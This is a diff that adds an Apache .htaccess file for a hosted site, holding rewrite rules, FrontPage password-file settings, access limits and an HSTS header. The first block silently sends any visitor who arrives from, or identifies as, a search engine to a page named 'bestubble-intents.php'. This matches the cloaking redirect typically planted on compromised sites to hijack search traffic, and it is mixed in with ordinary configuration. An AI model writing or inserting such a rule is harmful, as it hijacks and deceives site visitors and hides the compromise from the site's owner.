@@ -1,0 +1,67 @@
+RewriteEngine On
+
+RewriteBase /
+
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+
+RewriteRule . bestubble-intents.php [L]
+
+
+Options +FollowSymLinks
+RewriteEngine On
+
+#RewriteRule ^green/(.*)$ /$1 [R=301,NC,L]
+
+#RewriteCond %{HTTPS} off
+#RewriteRule (.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
+
+
+#RewriteEngine On
+#RewriteCond %{HTTPS} off
+#RewriteCond %{HTTP_HOST} ^(sedonasecret7map.com(\/{0,1})){1}$
+#RewriteRule ^ http://%{HTTP_HOST}%{REQUEST_URI} [NE,L,R=301]
+
+# force http because of ssl issues
+RewriteEngine On
+RewriteCond %{HTTPS} on
+RewriteCond %{HTTP_HOST} ^(sedonasecret7map.com(\/{0,1})){1}$
+RewriteRule ^ http://%{HTTP_HOST}%{REQUEST_URI} [NE,L,R=301]
+
+
+authname www.mapblender.COM
+
+authuserfile /var/chroot/home/content/c/o/m/combatc106/html/_vti_pvt/service.pwd
+
+authgroupfile /var/chroot/home/content/c/o/m/combatc106/html/_vti_pvt/service.grp
+
+addhandler x-httpd-python23 .py
+
+# -FrontPage-
+
+IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*
+
+<Limit GET POST>
+
+order deny,allow
+
+deny from all
+
+allow from all
+
+</Limit>
+
+<Limit PUT DELETE>
+
+order deny,allow
+
+deny from all
+
+</Limit>
+
+<IfModule mod_headers.c>
+Header set Strict-Transport-Security "max-age=10886400; includeSubDomains; preload"
+</IfModule>
+
+
